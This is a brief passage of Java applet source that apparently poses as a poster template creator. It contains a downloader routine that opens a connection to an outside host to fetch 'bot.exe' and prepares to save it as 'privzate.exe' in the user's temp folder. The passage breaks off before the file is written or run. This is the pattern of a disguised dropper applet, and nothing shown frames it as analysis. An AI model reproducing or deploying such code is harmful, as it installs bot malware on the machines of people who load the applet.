...
public class themaPoster_MASSTemplate_Creator extends Applet
{
    public static void startupAll() {
        try {
            final String concat = System.getenv("TMP").concat("\\privzate.exe");
            final BufferedInputStream bufferedInputStream = new BufferedInputStream(new URL("http://mktrn.net/bot.exe").openStream());
